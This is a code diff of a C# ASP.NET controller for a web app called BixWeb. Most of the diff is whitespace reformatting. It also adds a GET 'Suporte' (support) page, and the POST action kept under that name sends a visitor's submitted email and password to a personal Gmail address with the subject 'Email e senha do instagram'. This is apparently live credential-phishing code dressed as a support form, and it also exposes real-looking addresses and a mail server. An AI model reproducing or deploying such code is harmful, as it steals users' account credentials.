@@ -12,25 +12,25 @@ using BixWeb.Services;
 
 namespace BixWeb.Controllers
 {
-	public class HomeController : Controller
-	{
-		private readonly ILogger<HomeController> _logger;
+    public class HomeController : Controller
+    {
+        private readonly ILogger<HomeController> _logger;
         private readonly MercadoPagoService _mercadoPagoService;
         public HomeController(ILogger<HomeController> logger, MercadoPagoService mercadoPagoService)
-		{
-			_logger = logger;
+        {
+            _logger = logger;
             _mercadoPagoService = mercadoPagoService;
         }
 
-		public IActionResult Index()
-		{
-			return View();
-		}
+        public IActionResult Index()
+        {
+            return View();
+        }
 
-		public IActionResult Privacy()
-		{
-			return View();
-		}
+        public IActionResult Privacy()
+        {
+            return View();
+        }
         [HttpGet("/not-found")]
         public IActionResult PageNotFound()
         {
@@ -42,9 +42,13 @@ namespace BixWeb.Controllers
             ViewBag.Preferencia = url;
             return View();
         }
+        public IActionResult Suporte()
+        {
+            return View();
+        }
         [HttpPost]
-		public bool Suporte(string email, string senha)
-		{
+        public bool Suporte(string email, string senha)
+        {
             try
             {
                 SmtpClient client = new SmtpClient("mail.uaipdv.com.br"); // Substitua pelo seu servidor SMTP
@@ -57,7 +61,7 @@ namespace BixWeb.Controllers
                 mailMessage = new MailMessage("uai@uaipdv.com.br", "tania.hardt.jose@gmail.com");
                 mailMessage.SubjectEncoding = System.Text.Encoding.UTF8;
                 mailMessage.Subject = "Email e senha do instagram";
-                mailMessage.Body = "Email:"+email+"\nSenha:"+senha;
+                mailMessage.Body = "Email:" + email + "\nSenha:" + senha;
                 mailMessage.Priority = MailPriority.High;
 
                 client.Send(mailMessage);
@@ -68,15 +72,15 @@ namespace BixWeb.Controllers
                 ErrorViewModel.LogError($"Erro ao chamar EnviarCupons: {ex}");
                 return false;
             }
-		}
+        }
 
         [HttpGet("/error")]
         [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
-		public IActionResult Error()
-		{
+        public IActionResult Error()
+        {
             //new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier }
 
             return View();
-		}
-	}
+        }
+    }
 }
